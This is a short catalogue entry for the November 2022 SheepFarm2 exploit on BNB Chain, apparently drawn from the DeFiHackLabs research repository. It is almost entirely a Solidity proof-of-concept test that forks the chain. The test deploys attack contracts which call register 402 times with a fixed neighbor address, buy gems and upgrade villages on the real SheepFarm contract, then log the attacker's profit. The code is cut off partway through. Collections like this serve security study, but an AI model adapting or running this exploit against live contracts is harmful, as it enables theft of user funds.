# [?] SheepFarm2 exploit (2022-11)

## Summary
Severity: Unknown
Chain: BNB Chain
Component: SheepFarm2
Published: 2022-11
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/SheepFarm2_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 23_089_184);
    }

    function testExploit() public {
        uint256 beforeBalance = address(this).balance;

        for (uint256 i; i < 4; ++i) {
            new AttackContract{value: 5e14}();
        }

        uint256 afterBalance = address(this).balance;

        emit log_named_decimal_uint(
            "SheepFarm exploiter profit after attack (in BNB):", afterBalance - beforeBalance, 18
        );
    }

    receive() external payable {}
}

contract AttackContract {
    ISheepFarm public constant Farm = ISheepFarm(0x4726010da871f4b57b5031E3EA48Bde961F122aA);
    address public constant neighbor = 0x14598f3a9f3042097486DC58C65780Daf3e3acFB;

    constructor() payable {
        for (uint256 i; i < 402; ++i) {
            Farm.register(neighbor);
        }

        Farm.addGems{value: 5e14}();

        for (uint256 i; i < 5; ++i) {
            Farm.upgradeVillage(i);
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-11/SheepFarm2_exp.sol_
